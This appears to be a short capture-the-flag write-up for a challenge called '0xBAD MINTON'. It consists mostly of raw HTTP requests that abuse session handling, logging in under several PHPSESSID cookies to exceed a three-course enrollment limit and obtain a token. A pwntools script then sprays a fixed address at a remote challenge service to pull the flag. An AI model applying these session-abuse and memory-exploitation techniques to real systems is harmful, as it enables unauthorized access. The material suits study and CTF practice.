# 0xBAD MINTON

## Generate token which has more than 3 courses enrolled
* Login to one account by multiple `PHPSESSID` value, after login with `PHPSESSID=z1`, change that value and login again. E.g: z1,z2,z3

```
GET /login.php?username=tokiomonster17&password=tokiomonster17 HTTP/1.1
Host: 178.128.84.72
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Referer: http://178.128.84.72/courses.php
X-Requested-With: XMLHttpRequest
Cookie: PHPSESSID=z1
Connection: close
``` 

* Enroll courses with PHPSESSID: z1,z2,z3

```
GET /login.php?action=enroll HTTP/1.1
Host: 178.128.84.72
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Referer: http://178.128.84.72/courses.php
X-Requested-With: XMLHttpRequest
Cookie: PHPSESSID=z2
Connection: close
```

* Now we have token that have more than 3 courses enrolled

```
GET /courses.php HTTP/1.1
Host: 178.128.84.72
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Referer: http://178.128.84.72/courses.php
X-Requested-With: XMLHttpRequest
Cookie: PHPSESSID=z3
Connection: close
```

```
<a class="btn btn-outline-primary" style="border-radius: 5px 0px 0px 5px;" href="http://178.128.84.72/login.php?action=logout">Hello tokiomonster17</a>
<a class="btn btn-outline-success" style="border-radius: 0px 0px 0px 0px;" href="#">Enrolled: 6 courses</a>
<a class="btn btn-outline-danger" style="border-radius: 0px 5px 5px 0px;" href="#3ae3566f837d529c3104a2734ecc596347918aaf78db90501d380b66d0de8992">Token: 3ae3566f837d529c3104a2734ecc596347918aaf78db90501d380b66d0de8992</a>
```

## Pwn

```
from pwn import *

r = remote('178.128.84.72',9997)

FLAG = 0x604070
token = '3ae3566f837d529c3104a2734ecc596347918aaf78db90501d380b66d0de8992'
r.recvuntil("Token> ")
r.sendline(token)
r.recvuntil(">")
r.send(p64(FLAG)*128)
r.recvuntil(">")
r.send(p64(FLAG)*128)
r.recvuntil(">")
r.send(p64(FLAG)*128)
r.recvuntil(">")
r.send(p64(FLAG)*128)
r.recvuntil(">")
r.send(p64(FLAG)*128)
r.sendline("3")
r.interactive()
```